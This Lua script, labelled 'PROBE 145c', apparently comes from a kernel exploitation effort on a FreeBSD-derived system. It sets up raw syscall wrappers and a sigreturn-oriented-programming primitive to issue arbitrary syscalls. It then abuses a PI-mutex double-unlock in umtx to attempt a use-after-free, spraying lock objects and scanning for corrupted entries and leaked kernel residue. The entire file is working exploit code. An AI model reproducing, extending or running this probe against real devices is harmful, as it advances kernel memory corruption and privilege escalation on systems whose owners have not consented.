-- CRASH_CLASS: MODERATE
-- PROBE 145c: PI-mutex double-unlock UAF exploitation
--
-- 145b showed double-unlock returns 0 (should be EPERM in FreeBSD).
-- This probes whether the kernel frees umtx_pi twice, enabling UAF.
-- Pattern: lock → unlock → spray → double-unlock → check spray corruption

print("=== PROBE 145c: PI DOUBLE-UNLOCK UAF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC_S = 0x40
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc20 = make_syscall(20)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC_S + 0xA0)
local rh, rl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC_S + 0xA0, sc_addr)
    wq(srop_ctx + MC_S + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC_S + 0x08, a1) end
    if a2 then wq(srop_ctx + MC_S + 0x10, a2) end
    if a3 then wq(srop_ctx + MC_S + 0x18, a3) end
    if a4 then wq(srop_ctx + MC_S + 0x50, a4) end
    if a5 then wq(srop_ctx + MC_S + 0x28, a5) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local tid_buf = gpu + 0x100
wq(tid_buf, uint64(0))
srop(432, ua(tid_buf))
local main_tid = to_num(safe_rd(tid_buf))
print("tid=" .. main_tid)

local futex = gpu + 0x1000

print("")
print("--- [A] Futex qword analysis ---")
wd(futex, 0)
wd(futex + 4, 0)
print("[A] pre-lock: lo=" .. string.format("0x%X", safe_rd(futex) or 0) ..
    " hi=" .. string.format("0x%X", safe_rd(futex + 4) or 0))

local rv = srop(454, ua(futex), uint64(13), uint64(0))
print("[A] LOCK rv=" .. hex(rv))
print("[A] post-lock: lo=" .. string.format("0x%X", safe_rd(futex) or 0) ..
    " hi=" .. string.format("0x%X", safe_rd(futex + 4) or 0))
local fq = safe_rq(futex)
print("[A] qword=" .. hex(fq))

rv = srop(454, ua(futex), uint64(15), uint64(0))
print("[A] UNLOCK rv=" .. hex(rv))
print("[A] post-unlock: lo=" .. string.format("0x%X", safe_rd(futex) or 0) ..
    " hi=" .. string.format("0x%X", safe_rd(futex + 4) or 0))

print("")
print("--- [B] Triple unlock sequence ---")
wd(futex + 8, 0)
wd(futex + 12, 0)
rv = srop(454, ua(futex + 8), uint64(13), uint64(0))
print("[B] lock rv=" .. hex(rv) .. " futex=" .. string.format("0x%X", safe_rd(futex + 8) or 0))
rv = srop(454, ua(futex + 8), uint64(15), uint64(0))
print("[B] unlock1 rv=" .. hex(rv) .. " futex=" .. string.format("0x%X", safe_rd(futex + 8) or 0))
rv = srop(454, ua(futex + 8), uint64(15), uint64(0))
print("[B] unlock2 rv=" .. hex(rv) .. " futex=" .. string.format("0x%X", safe_rd(futex + 8) or 0))
rv = srop(454, ua(futex + 8), uint64(15), uint64(0))
print("[B] unlock3 rv=" .. hex(rv) .. " futex=" .. string.format("0x%X", safe_rd(futex + 8) or 0))
print("[B] pid=" .. to_num(sc20()))

print("")
print("--- [C] UAF spray: lock → unlock → spray 128 → double-unlock ---")
local spray_base = futex + 0x400
for i = 0, 127 do
    wd(spray_base + i * 4, 0)
end

wd(futex + 0x10, 0)
rv = srop(454, ua(futex + 0x10), uint64(13), uint64(0))
print("[C] lock rv=" .. hex(rv))
rv = srop(454, ua(futex + 0x10), uint64(15), uint64(0))
print("[C] unlock rv=" .. hex(rv))

local spray_ok = 0
for i = 0, 127 do
    rv = srop(454, ua(spray_base + i * 4), uint64(13), uint64(0))
    if to_num(rv) == 0 then spray_ok = spray_ok + 1 end
end
print("[C] sprayed " .. spray_ok .. "/128 PI locks")

rv = srop(454, ua(futex + 0x10), uint64(15), uint64(0))
print("[C] double-unlock rv=" .. hex(rv))
print("[C] target futex=" .. string.format("0x%X", safe_rd(futex + 0x10) or 0))

local corrupted = 0
for i = 0, 127 do
    local v = safe_rd(spray_base + i * 4)
    if v ~= nil and v ~= 0 and v ~= 0x80000000 then
        corrupted = corrupted + 1
        print("[C] CORRUPTED spray[" .. i .. "]=" .. string.format("0x%X", v))
    end
end
print("[C] corrupted spray entries: " .. corrupted .. "/128")
print("[C] pid=" .. to_num(sc20()))

print("")
print("--- [D] UAF spray with unlock-all after double-unlock ---")
for i = 0, 127 do
    rv = srop(454, ua(spray_base + i * 4), uint64(15), uint64(0))
end

local kern_ptr = 0
for off = 0, 0x3FF, 4 do
    local v = safe_rd(spray_base + off)
    if v ~= nil and v ~= 0 and v ~= 0x80000000 then
        print("[D] residue at +" .. string.format("%03X", off) .. "=" .. string.format("0x%X", v))
    end
end

print("[D] pid=" .. to_num(sc20()))

print("")
print("--- [E] 624 VM counter before/after ---")
local vm_before = srop(624)
print("[E] vm_counter=" .. hex(vm_before))

print("")
print("--- [F] Bulk double-unlock 64x ---")
for i = 0, 63 do
    wd(futex + 0x800 + i * 4, 0)
end
for i = 0, 63 do
    srop(454, ua(futex + 0x800 + i * 4), uint64(13), uint64(0))
end
for i = 0, 63 do
    srop(454, ua(futex + 0x800 + i * 4), uint64(15), uint64(0))
end
for i = 0, 63 do
    rv = srop(454, ua(futex + 0x800 + i * 4), uint64(15), uint64(0))
end
print("[F] 64 double-unlocks done")
print("[F] pid=" .. to_num(sc20()))

local vm_after = srop(624)
print("[F] vm_counter=" .. hex(vm_after))

for off = 0, 0xFF, 4 do
    local v = safe_rd(futex + 0x800 + off)
    if v ~= nil and v ~= 0 and v ~= 0x80000000 then
        print("[F] residue at +" .. string.format("%03X", off) .. "=" .. string.format("0x%X", v))
    end
end

print("")
print("=== PROBE 145c COMPLETE ===")
